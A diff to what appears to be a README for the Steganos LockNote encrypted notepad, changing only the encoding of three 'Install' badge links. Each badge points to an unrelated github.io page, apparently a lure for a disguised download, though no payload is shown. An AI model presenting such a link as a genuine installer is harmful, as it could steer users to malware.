@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Steganos LockNote](https://img.shields.io/badge/⬇_Install_Steganos%20LockNote-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos LockNote](https://img.shields.io/badge/⬇_Install_Steganos+LockNote-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Steganos LockNote is a free, portable encrypted notepad for Windows. Each LockNo
 
 <div align="center">
 
-[![⬇ Install Steganos LockNote](https://img.shields.io/badge/⬇_Install_Steganos%20LockNote-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos LockNote](https://img.shields.io/badge/⬇_Install_Steganos+LockNote-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Steganos LockNote is a free, portable encrypted notepad for Windows. Each LockNo
 
 <div align="center">
 
-[![⬇ Install Steganos LockNote](https://img.shields.io/badge/⬇_Install_Steganos%20LockNote-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos LockNote](https://img.shields.io/badge/⬇_Install_Steganos+LockNote-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
